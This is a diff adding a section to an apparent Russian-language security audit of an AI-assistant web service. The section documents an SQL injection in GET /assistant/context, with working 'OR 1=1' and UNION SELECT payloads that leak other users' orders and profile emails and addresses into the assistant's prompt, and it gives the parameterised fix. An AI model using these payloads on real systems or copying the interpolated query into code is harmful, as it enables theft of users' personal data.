@@ -320,3 +320,21 @@ LLM; подчинение проверить не удалось, т.к. мод�
 модель (`opencode/big-pickle`) оказалась недоступна (нет учётных данных opencode),
 но обязательный тест серверного контроля доступа к инструментам помощника выполнен
 и показал исполнение опасного ручного JSON без проверок.
+
+## 11. SQL-инъекция через order_id в GET /assistant/context (CWE-89)
+
+Эндпоинт строил запрос заказа интерполяцией: `SELECT * FROM orders WHERE id = {order_id}` (service.py:89). Инъекция через `order_id` подмешивает чужие данные прямо в промпт AI-помощника.
+
+Запрос (токен alice):
+```
+GET /assistant/context?order_id=0 OR 1=1
+```
+Фактический ответ — в промпт попал чужой заказ bob:
+```
+"Заказ: [{"id": 1, "owner": 1, "product": "chair", "price": 5000.0}, {"id": 2, "owner": 2, "product": "lamp", "price": 1500.0}]"
+```
+UNION-инъекция `order_id=1 UNION SELECT name,email,address,id FROM profiles` подмешала в промпт профили:
+```
+"Заказ: [..., {"id": "TEST_ALICE", "owner": "alice@example.invalid", "product": "TEST_ADDRESS_A", ...}, {"id": "TEST_BOB", "owner": "bob@example.invalid", "product": "TEST_ADDRESS_B", ...}]"
+```
+Актив: чужие заказы и профили (почты, адреса), утечка через контекст помощника. Доказательство: `evidence/before/11b_sqli_context.txt`. Исправление — параметризация и привязка к владельцу сессии (`WHERE id=? AND owner=?`).
